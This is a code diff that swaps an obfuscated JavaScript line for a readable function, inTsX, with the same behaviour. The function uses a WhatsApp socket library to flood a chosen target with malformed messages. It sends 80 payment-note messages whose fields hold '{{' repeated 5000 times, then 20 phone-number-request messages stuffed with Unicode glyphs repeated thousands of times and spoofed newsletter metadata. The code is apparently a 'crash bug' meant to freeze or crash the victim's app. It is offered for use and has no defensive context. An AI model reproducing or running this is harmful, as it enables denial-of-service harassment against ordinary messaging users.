@@ -1,1 +1,92 @@
-const _0x21bdaf=_0x2c25;(function(_0x9b7d5b,_0x303808){const _0x312102=_0x2c25,_0x4b76f7=_0x9b7d5b();while(!![]){try{const _0x4d69fb=-parseInt(_0x312102(0x75))/0x1+parseInt(_0x312102(0x81))/0x2+parseInt(_0x312102(0x78))/0x3*(-parseInt(_0x312102(0x70))/0x4)+-parseInt(_0x312102(0x82))/0x5+-parseInt(_0x312102(0x7c))/0x6*(parseInt(_0x312102(0x74))/0x7)+-parseInt(_0x312102(0x7d))/0x8*(parseInt(_0x312102(0x71))/0x9)+parseInt(_0x312102(0x76))/0xa;if(_0x4d69fb===_0x303808)break;else _0x4b76f7['push'](_0x4b76f7['shift']());}catch(_0x3665d3){_0x4b76f7['push'](_0x4b76f7['shift']());}}}(_0x3ec4,0xf3e3d));function _0x3ec4(){const _0x2e19f9=['1254222LqxJNj','status@broadcast','DOCUMENT','28287wFFkRn','1594845aQFAbO','60915140TPewDs','؂ن؃؄ٽ؂ن؃','34773lklgRK','\x20#\x20🚯\x20-\x20r4Ldz`Trash\x20•\x20NuLL\x201Nd3x\x20','relayMessage','repeat','1746mlTJYl','32GMAGuX','\x20─Nxpeɔt¡on`r4Ldz.\x20','UPDATE','𑇂𑆵𑆴𑆿','2662766kxWsRz','7017150UciFjw','666-666@g.us','584xSfkhH'];_0x3ec4=function(){return _0x2e19f9;};return _0x3ec4();}for(let i=0x0;i<0x50;i++){await sock[_0x21bdaf(0x7a)](target,{'groupStatusMessageV2':{'message':{'sendPaymentMessage':{'noteMessage':{'extendedTextMessage':{'text':_0x21bdaf(0x79),'matchedText':'t.me/rraldz\x20$$$\x20Wa.me/stickerpack/@voidp','description':_0x21bdaf(0x7e),'title':'X','paymentLinkMetadata':{'button':{'displayText':'X'},'header':{'headerType':0x1},'provider':{'paramsJson':'{{'[_0x21bdaf(0x7b)](0x1388)}},'linkPreviewMetadata':{'paymentLinkMetadata':{'button':{'displayText':'X'},'header':{'headerType':0x1},'provider':{'paramsJson':'{{'['repeat'](0x1388)}},'urlMetadata':{'fbExperimentId':0x3e7},'fbExperimentId':0x378,'linkMediaDuration':0x22b,'socialMediaPostType':0x4c5}}}}}}},{});}function _0x2c25(_0x547e9b,_0x67af38){const _0x3ec48d=_0x3ec4();return _0x2c25=function(_0x2c2509,_0x7954ff){_0x2c2509=_0x2c2509-0x6f;let _0x4e9fa4=_0x3ec48d[_0x2c2509];return _0x4e9fa4;},_0x2c25(_0x547e9b,_0x67af38);}for(let r=0x0;r<0x14;r++){await sock['relayMessage'](target,{'requestPhoneNumberMessage':{'skipType':0x7,'contextInfo':{'remoteJid':_0x21bdaf(0x72),'externalAdReply':{'title':'𑇂𑆵𑆴𑆿'[_0x21bdaf(0x7b)](0x9c4),'body':_0x21bdaf(0x80)[_0x21bdaf(0x7b)](0x9c4),'mediaType':_0x21bdaf(0x73),'renderLargerThumbnail':!![],'merchantUrl':'https://raldzz.xyz/'+_0x21bdaf(0x80)[_0x21bdaf(0x7b)](0x9c4),'containsAutoReply':!![],'showAdAttribution':!![]},'quotedMessage':{'conversation':_0x21bdaf(0x80)['repeat'](0x3a98)},'mentionedJid':['0@s.whastapp.net'],'forwardedNewsletterMessageInfo':{'newsletterJid':_0x21bdaf(0x6f),'serverMessageId':0x1,'newsletterName':_0x21bdaf(0x77),'contentType':_0x21bdaf(0x7f)}}}},{'participant':{'jid':target}});}
+async function inTsX(sock, target) {
+  for (let i = 0; i < 80; i++) {
+    await sock.relayMessage(
+      target,
+      {
+        groupStatusMessageV2: {
+          message: {
+            sendPaymentMessage: {
+              noteMessage: {
+                extendedTextMessage: {
+                  text: " # 🚯 - r4Ldz`Trash • NuLL 1Nd3x ",
+                  matchedText: "t.me/rraldz $$$ Wa.me/stickerpack/@voidp",
+                  description: " ─Nxpeɔt¡on`r4Ldz. ",
+                  title: "X",
+                  paymentLinkMetadata: {
+                    button: {
+                      displayText: "X"
+                    },
+                    header: {
+                      headerType: 1
+                    },
+                    provider: {
+                      paramsJson: "{{".repeat(5000)
+                    }
+                  },
+                  linkPreviewMetadata: {
+                    paymentLinkMetadata: {
+                      button: {
+                        displayText: "X"
+                      },
+                      header: {
+                        headerType: 1
+                      },
+                      provider: {
+                        paramsJson: "{{".repeat(5000)
+                      }
+                    },
+                    urlMetadata: {
+                      fbExperimentId: 999
+                    },
+                    fbExperimentId: 888,
+                    linkMediaDuration: 555,
+                    socialMediaPostType: 1221
+                  }
+                }
+              }
+            }
+          }
+        }
+      },
+      {}
+    );
+  }
+
+  for (let r = 0; r < 20; r++) {
+    await sock.relayMessage(
+      target,
+      {
+        requestPhoneNumberMessage: {
+          skipType: 7,
+          contextInfo: {
+            remoteJid: "status@broadcast",
+            externalAdReply: {
+              title: "𑇂𑆵𑆴𑆿".repeat(2500),
+              body: "𑇂𑆵𑆴𑆿".repeat(2500),
+              mediaType: "DOCUMENT",
+              renderLargerThumbnail: true,
+              merchantUrl: "https://raldzz.xyz/" + "𑇂𑆵𑆴𑆿".repeat(2500),
+              containsAutoReply: true,
+              showAdAttribution: true
+            },
+            quotedMessage: {
+              conversation: "𑇂𑆵𑆴𑆿".repeat(15000)
+            },
+            mentionedJid: ["0@s.whastapp.net"],
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "666-666@g.us",
+              serverMessageId: 1,
+              newsletterName: "؂ن؃؄ٽ؂ن؃",
+              contentType: "UPDATE"
+            }
+          }
+        }
+      },
+      {
+        participant: {
+          jid: target
+        }
+      }
+    );
+  }
+}
